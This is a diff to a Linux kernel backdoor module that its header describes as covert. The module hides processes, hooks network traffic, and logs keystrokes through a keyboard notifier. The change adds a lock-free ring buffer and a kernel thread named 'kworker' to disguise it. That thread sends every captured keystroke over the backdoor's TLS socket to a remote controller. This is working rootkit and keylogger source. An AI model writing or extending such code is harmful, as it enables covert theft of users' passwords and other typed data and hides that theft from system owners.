@@ -5,6 +5,7 @@
  * The covert module for complimenting the backdoor
  */
 
+#include <linux/circ_buf.h>
 #include <linux/init.h>
 #include <linux/ip.h>
 #include <linux/kernel.h>
@@ -63,6 +64,10 @@ struct task_pid {
 static struct task_pid hidden_procs[10];
 int hidden_count = 0;
 static rwlock_t* my_tasklist_lock;
+
+static const char* key_circ_buf[64];
+static size_t key_head = 0;
+static size_t key_tail = 0;
 
 int send_msg(struct socket* sock, unsigned char* buf, size_t len);
 int recv_msg(struct socket* sock, unsigned char* buf, size_t len);
@@ -513,6 +518,8 @@ unsigned int outgoing_hook(void* priv, struct sk_buff* skb, const struct nf_hook
 int keysniffer_cb(struct notifier_block* nblock, unsigned long code, void* _param) {
     struct keyboard_notifier_param* param = _param;
     const char* keycode = NULL;
+    unsigned long head;
+    unsigned long tail;
 
     /* Trace only when a key is pressed down */
     if (!(param->down)) {
@@ -530,9 +537,47 @@ int keysniffer_cb(struct notifier_block* nblock, unsigned long code, void* _para
         return NOTIFY_OK;
     }
 
+    //Can't just write directly inside an interrupt context, so use a circular buffer to pass to a different thread
+
     printk(KERN_INFO "Keycode: %s\n", keycode);
 
+    head = key_head;
+    // The spin_unlock() and next spin_lock() provide needed ordering.
+    tail = READ_ONCE(key_tail);
+
+    if (CIRC_SPACE(head, tail, 64) >= 1) {
+        // insert one item into the buffer
+        key_circ_buf[head] = keycode;
+
+        smp_store_release(&key_head, (head + 1) & (64 - 1));
+
+        // wake_up() will make sure that the head is committed before waking anyone up
+        //wake_up(consumer);
+    }
+
     return NOTIFY_OK;
+}
+
+int consume_keys(void) {
+    unsigned long head;
+    unsigned long tail;
+    const char *item;
+    while (!kthread_should_stop()) {
+        // Read index before reading contents at that index.
+        head = smp_load_acquire(&key_head);
+        tail = key_tail;
+
+        if (CIRC_CNT(head, tail, 64) >= 1) {
+            // extract one item from the buffer
+            item = key_circ_buf[tail];
+
+            send_msg(svc->tls_socket, (unsigned char *) item, strlen(item));
+
+            // Finish reading descriptor before incrementing tail.
+            smp_store_release(&key_tail, (tail + 1) & (64 - 1));
+        }
+    }
+    return 0;
 }
 
 /*
@@ -554,7 +599,7 @@ static int __init mod_init(void) {
     change_pidR = (void (*)(struct task_struct*, enum pid_type, struct pid*)) kallsyms_lookup_name(
             "change_pid");
     alloc_pidR = (struct pid * (*) (struct pid_namespace*) ) kallsyms_lookup_name("alloc_pid");
-    my_tasklist_lock = (rwlock_t *) kallsyms_lookup_name("tasklist_lock");
+    my_tasklist_lock = (rwlock_t*) kallsyms_lookup_name("tasklist_lock");
 
     nfhi.hook = incoming_hook;
     nfhi.hooknum = NF_INET_LOCAL_IN;
@@ -590,6 +635,8 @@ static int __init mod_init(void) {
     printk(KERN_ALERT "backdoor module loaded\n");
 
     register_keyboard_notifier(&keysniffer_blk);
+
+    kthread_run((void*) consume_keys, NULL, "kworker");
 
     return 0;
 }
